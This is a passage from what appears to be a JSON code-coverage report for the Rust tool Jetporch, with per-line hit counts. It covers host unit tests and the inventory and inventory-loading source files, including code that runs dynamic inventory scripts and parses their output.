Host::new(\u0026\"test-host\".to_string());\n        let group = create_test_group(\"web\");\n        \n        host.add_group(\u0026\"web\".to_string(), group.clone());\n        \n        // Direct group membership\n        assert!(host.has_ancestor_group(\u0026\"web\".to_string()));\n        \n        // Non-existent group\n        assert!(!host.has_ancestor_group(\u0026\"nonexistent\".to_string()));\n    }\n\n    #[test]\n    fn test_variables() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        // Initially empty\n        assert!(host.get_variables().is_empty());\n        \n        // Set variables\n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"value1\".to_string())\n        );\n        host.set_variables(vars.clone());\n        \n        let retrieved = host.get_variables();\n        assert_eq!(retrieved[\"key1\"], \"value1\");\n    }\n\n    #[test]\n    fn test_update_variables() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        // Set initial variables\n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"value1\".to_string())\n        );\n        host.set_variables(vars);\n        \n        // Update with new variables\n        let mut update = serde_yaml::Mapping::new();\n        update.insert(\n            serde_yaml::Value::String(\"key2\".to_string()),\n            serde_yaml::Value::String(\"value2\".to_string())\n        );\n        update.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"updated1\".to_string())\n        );\n        host.update_variables(update);\n        \n        let vars = host.get_variables();\n        assert_eq!(vars[\"key1\"], \"updated1\");\n        assert_eq!(vars[\"key2\"], \"value2\");\n    }\n\n    #[test]\n    fn test_update_facts() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        let mut facts = serde_yaml::Mapping::new();\n        facts.insert(\n            serde_yaml::Value::String(\"os_family\".to_string()),\n            serde_yaml::Value::String(\"debian\".to_string())\n        );\n        facts.insert(\n            serde_yaml::Value::String(\"kernel\".to_string()),\n            serde_yaml::Value::String(\"linux\".to_string())\n        );\n        \n        host.update_facts2(facts);\n        \n        // Facts should be included in blended variables\n        let blended = host.get_blended_variables();\n        assert_eq!(blended[\"os_family\"], \"debian\");\n        assert_eq!(blended[\"kernel\"], \"linux\");\n    }\n\n    #[test]\n    fn test_get_variables_yaml() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key\".to_string()),\n            serde_yaml::Value::String(\"value\".to_string())\n        );\n        host.set_variables(vars);\n        \n        let yaml = host.get_variables_yaml().unwrap();\n        assert!(yaml.contains(\"key: value\"));\n    }\n\n    #[test]\n    fn test_get_blended_variables_yaml() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"host_var\".to_string()),\n            serde_yaml::Value::String(\"host_value\".to_string())\n        );\n        host.set_variables(vars);\n        \n        let yaml = host.get_blended_variables_yaml().unwrap();\n        assert!(yaml.contains(\"host_var: host_value\"));\n    }\n\n    #[test]\n    fn test_package_preference() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        assert!(host.package_preference.is_none());\n        \n        host.package_preference = Some(PackagePreference::Dnf);\n        assert!(matches!(host.package_preference, Some(PackagePreference::Dnf)));\n        \n        host.package_preference = Some(PackagePreference::Yum);\n        assert!(matches!(host.package_preference, Some(PackagePreference::Yum)));\n    }\n\n    #[test]\n    fn test_get_ancestor_groups_and_names() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let group1 = create_test_group(\"web\");\n        let group2 = create_test_group(\"prod\");\n        \n        host.add_group(\u0026\"web\".to_string(), group1);\n        host.add_group(\u0026\"prod\".to_string(), group2);\n        \n        let ancestors = host.get_ancestor_groups(10);\n        assert!(ancestors.len() \u003e= 2);\n        \n        let names = host.get_ancestor_group_names();\n        assert!(names.contains(\u0026\"web\".to_string()));\n        assert!(names.contains(\u0026\"prod\".to_string()));\n    }\n\n    #[test]\n    fn test_blended_variables_with_groups() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        // Create group with variables\n        let group = create_test_group(\"web\");\n        {\n            let mut group_mut = group.write().unwrap();\n            let mut group_vars = serde_yaml::Mapping::new();\n            group_vars.insert(\n                serde_yaml::Value::String(\"port\".to_string()),\n                serde_yaml::Value::Number(serde_yaml::Number::from(80))\n            );\n            group_vars.insert(\n                serde_yaml::Value::String(\"service\".to_string()),\n                serde_yaml::Value::String(\"nginx\".to_string())\n            );\n            group_mut.set_variables(group_vars);\n        }\n        \n        host.add_group(\u0026\"web\".to_string(), group);\n        \n        // Set host variables\n        let mut host_vars = serde_yaml::Mapping::new();\n        host_vars.insert(\n            serde_yaml::Value::String(\"port\".to_string()),\n            serde_yaml::Value::Number(serde_yaml::Number::from(8080))\n        );\n        host_vars.insert(\n            serde_yaml::Value::String(\"hostname\".to_string()),\n            serde_yaml::Value::String(\"webserver1\".to_string())\n        );\n        host.set_variables(host_vars);\n        \n        // Test blending - host vars should override group vars\n        let blended = host.get_blended_variables();\n        assert_eq!(blended[\"port\"], 8080); // Host overrides group\n        assert_eq!(blended[\"service\"], \"nginx\"); // From group\n        assert_eq!(blended[\"hostname\"], \"webserver1\"); // From host\n    }\n}\n","traces":[{"line":53,"address":[],"length":0,"stats":{"Line":44}},{"line":55,"address":[],"length":0,"stats":{"Line":44}},{"line":56,"address":[],"length":0,"stats":{"Line":44}},{"line":57,"address":[],"length":0,"stats":{"Line":44}},{"line":59,"address":[],"length":0,"stats":{"Line":44}},{"line":61,"address":[],"length":0,"stats":{"Line":44}},{"line":62,"address":[],"length":0,"stats":{"Line":44}},{"line":67,"address":[],"length":0,"stats":{"Line":4}},{"line":68,"address":[],"length":0,"stats":{"Line":6}},{"line":69,"address":[],"length":0,"stats":{"Line":2}},{"line":71,"address":[],"length":0,"stats":{"Line":4}},{"line":72,"address":[],"length":0,"stats":{"Line":4}},{"line":75,"address":[],"length":0,"stats":{"Line":10}},{"line":76,"address":[],"length":0,"stats":{"Line":10}},{"line":77,"address":[],"length":0,"stats":{"Line":10}},{"line":78,"address":[],"length":0,"stats":{"Line":4}},{"line":80,"address":[],"length":0,"stats":{"Line":6}},{"line":84,"address":[],"length":0,"stats":{"Line":6}},{"line":85,"address":[],"length":0,"stats":{"Line":6}},{"line":88,"address":[],"length":0,"stats":{"Line":10}},{"line":89,"address":[],"length":0,"stats":{"Line":14}},{"line":90,"address":[],"length":0,"stats":{"Line":4}},{"line":91,"address":[],"length":0,"stats":{"Line":4}},{"line":93,"address":[],"length":0,"stats":{"Line":10}},{"line":94,"address":[],"length":0,"stats":{"Line":6}},{"line":95,"address":[],"length":0,"stats":{"Line":6}},{"line":98,"address":[],"length":0,"stats":{"Line":4}},{"line":103,"address":[],"length":0,"stats":{"Line":6}},{"line":104,"address":[],"length":0,"stats":{"Line":8}},{"line":105,"address":[],"length":0,"stats":{"Line":6}},{"line":107,"address":[],"length":0,"stats":{"Line":2}},{"line":109,"address":[],"length":0,"stats":{"Line":4}},{"line":116,"address":[],"length":0,"stats":{"Line":14}},{"line":117,"address":[],"length":0,"stats":{"Line":14}},{"line":118,"address":[],"length":0,"stats":{"Line":50}},{"line":119,"address":[],"length":0,"stats":{"Line":18}},{"line":121,"address":[],"length":0,"stats":{"Line":14}},{"line":124,"address":[],"length":0,"stats":{"Line":6}},{"line":125,"address":[],"length":0,"stats":{"Line":10}},{"line":126,"address":[],"length":0,"stats":{"Line":4}},{"line":127,"address":[],"length":0,"stats":{"Line":2}},{"line":130,"address":[],"length":0,"stats":{"Line":4}},{"line":135,"address":[],"length":0,"stats":{"Line":4}},{"line":136,"address":[],"length":0,"stats":{"Line":8}},{"line":137,"address":[],"length":0,"stats":{"Line":4}},{"line":138,"address":[],"length":0,"stats":{"Line":2}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":2}},{"line":149,"address":[],"length":0,"stats":{"Line":2}},{"line":150,"address":[],"length":0,"stats":{"Line":8}},{"line":153,"address":[],"length":0,"stats":{"Line":14}},{"line":154,"address":[],"length":0,"stats":{"Line":14}},{"line":157,"address":[],"length":0,"stats":{"Line":10}},{"line":159,"address":[],"length":0,"stats":{"Line":10}},{"line":160,"address":[],"length":0,"stats":{"Line":20}},{"line":161,"address":[],"length":0,"stats":{"Line":10}},{"line":162,"address":[],"length":0,"stats":{"Line":10}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":10}},{"line":169,"address":[],"length":0,"stats":{"Line":2}},{"line":170,"address":[],"length":0,"stats":{"Line":8}},{"line":173,"address":[],"length":0,"stats":{"Line":14}},{"line":174,"address":[],"length":0,"stats":{"Line":14}},{"line":177,"address":[],"length":0,"stats":{"Line":10}},{"line":178,"address":[],"length":0,"stats":{"Line":10}},{"line":181,"address":[],"length":0,"stats":{"Line":2}},{"line":182,"address":[],"length":0,"stats":{"Line":10}},{"line":183,"address":[],"length":0,"stats":{"Line":4}},{"line":187,"address":[],"length":0,"stats":{"Line":6}},{"line":188,"address":[],"length":0,"stats":{"Line":6}},{"line":189,"address":[],"length":0,"stats":{"Line":6}},{"line":190,"address":[],"length":0,"stats":{"Line":10}},{"line":191,"address":[],"length":0,"stats":{"Line":2}},{"line":192,"address":[],"length":0,"stats":{"Line":2}},{"line":194,"address":[],"length":0,"stats":{"Line":6}},{"line":195,"address":[],"length":0,"stats":{"Line":6}},{"line":196,"address":[],"length":0,"stats":{"Line":6}},{"line":197,"address":[],"length":0,"stats":{"Line":6}},{"line":198,"address":[],"length":0,"stats":{"Line":6}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":2}},{"line":209,"address":[],"length":0,"stats":{"Line":2}},{"line":212,"address":[],"length":0,"stats":{"Line":2}},{"line":213,"address":[],"length":0,"stats":{"Line":2}},{"line":214,"address":[],"length":0,"stats":{"Line":2}},{"line":215,"address":[],"length":0,"stats":{"Line":2}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":2}},{"line":221,"address":[],"length":0,"stats":{"Line":2}},{"line":222,"address":[],"length":0,"stats":{"Line":2}},{"line":223,"address":[],"length":0,"stats":{"Line":2}},{"line":224,"address":[],"length":0,"stats":{"Line":0}}],"covered":87,"coverable":97},{"path":["/","Users","wings","projects","jetpack","src","inventory","inventory.rs"],"content":"\nuse std::collections::{HashMap};\nuse std::sync::Arc;\nuse crate::inventory::hosts::Host;\nuse crate::inventory::groups::Group;\nuse std::sync::RwLock;\n\npub struct Inventory {\n    pub groups : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e,\n    pub hosts  : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e,\n    // SSH inventory is not required to have a localhost in it but needs the object\n    // regardless, this is returned if it is not in inventory so we always get the same\n    // object.\n    backup_localhost: Arc\u003cRwLock\u003cHost\u003e\u003e\n}\n\nimpl Inventory {\n\n    pub fn new() -\u003e Self {\n        Self {\n            groups : HashMap::new(),\n            hosts  : HashMap::new(),\n            backup_localhost: Arc::new(RwLock::new(Host::new(\u0026String::from(\"localhost\"))))\n        }\n    }\n\n    pub fn has_group(\u0026self, group_name: \u0026String) -\u003e bool {\n        return self.groups.contains_key(\u0026group_name.clone());\n    }\n\n    pub fn get_group(\u0026self, group_name: \u0026String) -\u003e Arc\u003cRwLock\u003cGroup\u003e\u003e {\n        let arc = self.groups.get(group_name).unwrap();\n        return Arc::clone(\u0026arc); \n    }\n\n    pub fn has_host(\u0026self, host_name: \u0026String) -\u003e bool {\n        return self.hosts.contains_key(host_name);\n    }\n\n    pub fn get_host(\u0026self, host_name: \u0026String) -\u003e Arc\u003cRwLock\u003cHost\u003e\u003e {\n\n        // an explicit fetch of a host is sometimes performed by the connection plugin\n        // which does not bother with the has_host check. If localhost is not in inventory\n        // we don't need any variables from it.\n\n        if self.has_host(host_name) {\n            let host = self.hosts.get(host_name).unwrap();\n            return Arc::clone(\u0026host);\n        }\n        else if host_name.eq(\"localhost\") {\n            return Arc::clone(\u0026self.backup_localhost);\n        } else {\n            panic!(\"internal error: code should call has_host before get_host\");\n        }\n    }\n\n    // ==============================================================================================================\n    // PACKAGE API (for use by loading.rs only)\n    // ==============================================================================================================\n\n    pub fn store_subgroup(\u0026mut self, group_name: \u0026String, subgroup_name: \u0026String) {\n        if self.has_group(group_name) { self.create_group(group_name); }\n        if !self.has_group(subgroup_name) { self.create_group(subgroup_name); }\n        self.associate_subgroup(group_name, subgroup_name);\n    }\n\n    pub fn store_group_variables(\u0026mut self, group_name: \u0026String, mapping: serde_yaml::Mapping) {\n        let group = self.get_group(group_name);\n        group.write().expect(\"group write\").set_variables(mapping);\n    }\n\n    pub fn store_group(\u0026mut self, group: \u0026String) {\n        self.create_group(\u0026group.clone()); \n    }\n\n    pub fn associate_host(\u0026mut self, group_name: \u0026String, host_name: \u0026String, host: Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        if !self.has_host(\u0026host_name) { panic!(\"host does not exist\"); }\n        if !self.has_group(\u0026group_name) { self.create_group(group_name); }\n        let group_obj = self.get_group(group_name);\n        // FIXME: these add method should all take strings, not all are consistent yet?\n        group_obj.write().unwrap().add_host(\u0026host_name.clone(), host);\n        self.associate_host_to_group(\u0026group_name.clone(), \u0026host_name.clone());\n    }\n\n    pub fn associate_host_to_group(\u0026self, group_name: \u0026String, host_name: \u0026String) {\n        let host = self.get_host(host_name);\n        let group = self.get_group(group_name);\n        host.write().expect(\"host write\").add_group(group_name, Arc::clone(\u0026group));\n        group.write().expect(\"group write\").add_host(host_name, Arc::clone(\u0026host));\n    }\n\n    pub fn store_host_variables(\u0026mut self, host_name: \u0026String, mapping: serde_yaml::Mapping) {\n        let host = self.get_host(host_name);\n        host.write().unwrap().set_variables(mapping);\n    }\n\n    pub fn create_host(\u0026mut self, host_name: \u0026String) {\n        assert!(!self.has_host(host_name));\n        self.hosts.insert(host_name.clone(), Arc::new(RwLock::new(Host::new(\u0026host_name.clone()))));\n    }\n\n    pub fn store_host(\u0026mut self, group_name: \u0026String, host_name: \u0026String) {\n        if !(self.has_host(\u0026host_name)) {\n            self.create_host(\u0026host_name);\n        }\n        let host = self.get_host(host_name);\n        self.associate_host(group_name, host_name, Arc::clone(\u0026host));\n    }\n\n    // ==============================================================================================================\n    // PRIVATE INTERNALS\n    // ==============================================================================================================\n\n    fn create_group(\u0026mut self, group_name: \u0026String) {\n        if self.has_group(group_name) {\n            return;\n        }\n        self.groups.insert(group_name.clone(), Arc::new(RwLock::new(Group::new(\u0026group_name.clone()))));\n        if !group_name.eq(\u0026String::from(\"all\")) {\n            self.associate_subgroup(\u0026String::from(\"all\"), \u0026group_name);\n        }\n    }\n\n    fn associate_subgroup(\u0026mut self, group_name: \u0026String, subgroup_name: \u0026String) {\n        if !self.has_group(\u0026group_name.clone()) { self.create_group(\u0026group_name.clone()); }\n        if !self.has_group(\u0026subgroup_name.clone()) { self.create_group(\u0026subgroup_name.clone()); }\n        {\n            let group = self.get_group(group_name);\n            let subgroup = self.get_group(subgroup_name);\n            group.write().expect(\"group write\").add_subgroup(subgroup_name, Arc::clone(\u0026subgroup));\n        }\n        {\n            let group = self.get_group(group_name);\n            let subgroup = self.get_group(subgroup_name);\n            subgroup.write().expect(\"subgroup write\").add_parent(group_name, Arc::clone(\u0026group));\n        }\n    }\n\n\n}","traces":[{"line":19,"address":[],"length":0,"stats":{"Line":0}},{"line":21,"address":[],"length":0,"stats":{"Line":0}},{"line":22,"address":[],"length":0,"stats":{"Line":0}},{"line":23,"address":[],"length":0,"stats":{"Line":0}},{"line":27,"address":[],"length":0,"stats":{"Line":0}},{"line":28,"address":[],"length":0,"stats":{"Line":0}},{"line":31,"address":[],"length":0,"stats":{"Line":0}},{"line":32,"address":[],"length":0,"stats":{"Line":0}},{"line":33,"address":[],"length":0,"stats":{"Line":0}},{"line":36,"address":[],"length":0,"stats":{"Line":0}},{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":64},{"path":["/","Users","wings","projects","jetpack","src","inventory","loading.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::path::{Path,PathBuf};\nuse Vec;\nuse serde::Deserialize;\nuse crate::util::io::{path_walk,jet_file_open,path_basename_as_string,is_executable};\nuse crate::util::yaml::show_yaml_error_in_context;\nuse crate::inventory::inventory::Inventory;\nuse std::sync::Arc;\nuse std::sync::RwLock;\nuse serde_json;\nuse std::collections::HashMap;\nuse std::process::Command;\nuse crate::connection::local::convert_out;\nuse crate::util::io::directory_as_string;\n\n// ==============================================================================================================\n// YAML SPEC\n// ==============================================================================================================\n// for groups/\u003cgroupname\u003e inventory files\n\n//#[derive(Debug, PartialEq, Deserialize)]\n#[derive(Debug,Deserialize)]\n#[serde(deny_unknown_fields)]\npub struct YamlGroup {\n    hosts     : Option\u003cVec\u003cString\u003e\u003e,\n    subgroups : Option\u003cVec\u003cString\u003e\u003e,\n}\n\n#[derive(Debug,Deserialize)]\n#[serde(deny_unknown_fields)]\npub enum DynamicInventoryJson {\n    Entry(HashMap\u003cString, DynamicInventoryJsonEntry\u003e)\n}\n\n/* groups named _meta are not real groups */\n#[derive(Debug,Deserialize)]\n#[serde(deny_unknown_fields)]\npub struct DynamicInventoryJsonEntry {\n    hostvars : Option\u003cserde_json::Map\u003cString, serde_json::Value\u003e\u003e, /* if supplied, hosts is not supplied */\n    vars     :  Option\u003cserde_json::Map\u003cString, serde_json::Value\u003e\u003e,\n    children : Option\u003cVec\u003cString\u003e\u003e,\n    hosts    : Option\u003cVec\u003cString\u003e\u003e\n}\n\n// ==============================================================================================================\n// PUBLIC API\n// ==============================================================================================================\n\npub fn load_inventory(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, inventory_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e) -\u003e Result\u003c(), String\u003e {\n\n    {\n        let mut inv_obj = inventory.write().unwrap();\n        inv_obj.store_group(\u0026String::from(\"all\"));\n    }\n\n    for inventory_path_buf in inventory_paths.read().unwrap().iter() {\n        let inventory_path = inventory_path_buf.as_path();\n        if inventory_path.is_dir() {\n            let groups_pathbuf      = inventory_path_buf.join(\"groups\");\n            let groups_path         = groups_pathbuf.as_path();\n\n            if groups_path.exists() \u0026\u0026 groups_path.is_dir() {\n                load_on_disk_inventory_tree(inventory, true, \u0026inventory_path)?;\n            } else {\n                return Err(format!(\"missing groups/ in --inventory path parameter ({})\", inventory_path.display()))\n            }\n        } else {\n            if is_executable(\u0026inventory_path) {\n                load_dynamic_inventory(inventory, \u0026inventory_path)?;\n                let dirname = directory_as_string(\u0026inventory_path);\n                let dir = Path::new(\u0026dirname);\n                load_on_disk_inventory_tree(inventory, false, \u0026dir)?;\n            } else {\n                return Err(format!(\"non-directory path to --inventory ({}) is not executable\", inventory_path.display()))\n            }    \n        }\n    }\n    return Ok(())\n}\n\n// ==============================================================================================================\n// PRIVATE INTERNALS\n// ==============================================================================================================\n\n// loads an entire on-disk inventory tree structure (groups/, group_vars/, host_vars/)\nfn load_on_disk_inventory_tree(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, include_groups: bool, path: \u0026Path) -\u003e Result\u003c(), String\u003e {\n    let path_buf           = PathBuf::from(path);\n    let group_vars_pathbuf = path_buf.join(\"group_vars\");\n    let host_vars_pathbuf  = path_buf.join(\"host_vars\");\n    let groups_path        = path_buf.join(\"groups\");\n    let group_vars_path    = group_vars_pathbuf.as_path();\n    let host_vars_path     = host_vars_pathbuf.as_path();\n      \n    if include_groups {\n        load_groups_directory(inventory, \u0026groups_path)?;\n    }\n    if group_vars_path.exists() {\n        load_vars_directory(inventory, \u0026group_vars_path, true)?;\n    }\n    if host_vars_path.exists() {\n        load_vars_directory(inventory, \u0026host_vars_path, false)?;\n    }\n    return Ok(())\n}\n\n// for inventory/groups/* files\nfn load_groups_directory(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, path: \u0026Path) -\u003e Result\u003c(), String\u003e {\n    path_walk(path, |groups_file_path| {\n\n        let mut group_name = path_basename_as_string(\u0026groups_file_path).clone();\n\n        // skip dot files and backup files\n        if group_name.ends_with(\"~\") || group_name.starts_with(\".\") {\n            return Ok(());\n        }\n\n        // ignore yaml extensions\n        if group_name.ends_with(\".yml\") {\n            group_name = group_name[0 .. group_name.len() - 4].to_string();\n        }\n\n        let groups_file = jet_file_open(\u0026groups_file_path)?;\n        let groups_file_parse_result: Result\u003cYamlGroup, serde_yaml::Error\u003e = serde_yaml::from_reader(groups_file);\n        if groups_file_parse_result.is_err() {\n            show_yaml_error_in_context(\u0026groups_file_parse_result.unwrap_err(), \u0026groups_file_path);\n            return Err(format!(\"edit the file and try again?\"));\n        }   \n        let yaml_result = groups_file_parse_result.unwrap();\n        add_group_file_contents_to_inventory(inventory, group_name.clone(), \u0026yaml_result);\n        Ok(())\n    })?;\n    Ok(())\n}\n\n\n// for inventory/groups/* files\nfn add_group_file_contents_to_inventory(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, group_name: String, yaml_group: \u0026YamlGroup) {\n    let mut inventory = inventory.write().unwrap();\n    let hosts = \u0026yaml_group.hosts;\n    if hosts.is_some() {\n        let hosts = hosts.as_ref().unwrap();\n        for hostname in hosts { inventory.store_host(\u0026group_name.clone(), \u0026hostname.clone()); }\n    }\n    let subgroups = \u0026yaml_group.subgroups;\n    if subgroups.is_some() {\n        let subgroups = subgroups.as_ref().unwrap();\n        for subgroupname in subgroups {\n            // FIXME: we should not panic here, but do something better\n            if !group_name.eq(subgroupname) {\n                inventory.store_subgroup(\u0026group_name.clone(), \u0026subgroupname.clone()); \n            }\n        }\n    }\n\n}\n            \n// this is used by both on-disk and dynamic inventory sources to load group_vars/ and host_vars/ directories\nfn load_vars_directory(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, path: \u0026Path, is_group: bool) -\u003e Result\u003c(), String\u003e {\n\n    let inv = inventory.write().unwrap();\n\n    path_walk(path, |vars_path| {\n\n        let mut effective_name = path_basename_as_string(\u0026vars_path).clone();\n        // skip dot files and backup files\n        if effective_name.ends_with(\"~\") || effective_name.starts_with(\".\") {\n            return Ok(());\n        }\n        // ignore yaml extensions\n        if effective_name.ends_with(\".yml\") {\n            effective_name = effective_name[0 .. effective_name.len() - 4].to_string();\n        }\n\n        // FIXME: warning and continue instead?\n        match is_group {\n            true =\u003e {\n                if !inv.has_group(\u0026effective_name.clone()) { return Ok(()); }\n            } false =\u003e {\n                if !inv.has_host(\u0026effective_name.clone()) { return Ok(()); }\n            }\n        }\n        \n        let file = jet_file_open(\u0026vars_path)?;\n        let file_parse_result: Result\u003cserde_yaml::Mapping, serde_yaml::Error\u003e = serde_yaml::from_reader(file);\n        if file_parse_result.is_err() {\n             show_yaml_error_in_context(\u0026file_parse_result.unwrap_err(), \u0026vars_path);\n             return Err(format!(\"edit the file and try again?\"));\n        } \n        let yaml_result = file_parse_result.unwrap();\n        \n        // serialize the vars again just to make them easier to store/output elsewhere\n        // this will also remove any comments and shorten things up\n        //let yaml_string = \u0026serde_yaml::to_string(\u0026yaml_result).unwrap();\n        match is_group {\n            true  =\u003e {\n                let group = inv.get_group(\u0026effective_name.clone());\n                group.write().unwrap().set_variables(yaml_result);\n            }\n            false =\u003e {\n                let host = inv.get_host(\u0026effective_name);\n                host.write().unwrap().set_variables(yaml_result);\n            }\n        }\n        Ok(())\n    })?;\n    Ok(())\n}\n\n// TODO: implement\nfn load_dynamic_inventory(inv: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, path: \u0026Path) -\u003e Result\u003c(), String\u003e {\n\n    let mut inventory = inv.write().unwrap();\n\n    let mut command = Command::new(format!(\"{}\", path.display()));\n    let output = match command.output() {\n        Ok(x) =\u003e {\n            match x.status.code() {\n                Some(_rc) =\u003e convert_out(\u0026x.stdout,\u0026x.stderr),\n                None =\u003e { return Err(format!(\"unable to get status code from process: {}\", path.display())) }\n            }\n        },\n        Err(y) =\u003e { return Err(format!(\"inventory script failed: {}, {}\", path.display(), y)); }\n    };\n\n    let file_parse_result: Result\u003cHashMap\u003cString, DynamicInventoryJsonEntry\u003e, serde_json::Error\u003e = serde_json::from_str(\u0026output);\n    if file_parse_result.is_err() {\n       return Err(format!(\"error parsing dynamic inventory source: {:?}: {:?}\", path.display(), \u0026file_parse_result.unwrap_err()));\n    } \n    let json_result = file_parse_result.unwrap();\n\n    for (possible_group_name, entry) in json_result.iter() {\n        let group_name = match possible_group_name.eq(\"_meta\") {\n            true =\u003e String::from(\"all\"),\n            false =\u003e possible_group_name.clone(),\n        };\n        if group_name.starts_with(\"_\") {\n            continue;\n        }\n        \n        inventory.store_group(\u0026group_name);\n        let group = inventory.get_group(\u0026group_name);\n\n        if entry.hostvars.is_some() {\n            let hostvars = entry.hostvars.as_ref().unwrap();\n            for (host_name, values) in hostvars.iter() {\n                inventory.store_host(\u0026group_name, \u0026host_name);\n                let host = inventory.get_host(\u0026host_name);\n                let vars = convert_json_vars(\u0026values);\n                let mut hst = host.write().unwrap();\n                hst.update_variables(vars);\n            }\n        }\n        if entry.hosts.is_some() {\n            let hosts = entry.hosts.as_ref().unwrap();\n            for host_name in hosts.iter() {\n                inventory.store_host(\u0026group_name, \u0026host_name);\n\n            }\n        }\n        if entry.children.as_ref().is_some() {\n            let subgroups = entry.children.as_ref().unwrap();\n            for subgroup_name in subgroups.iter() {\n                inventory.store_subgroup(\u0026group_name, \u0026subgroup_name);\n            }\n        }\n        if entry.vars.as_ref().is_some() {\n            let mut grp = group.write().unwrap();\n            let vars = convert_json_vars(\u0026serde_json::Value::Object(entry.vars.clone().unwrap()));\n            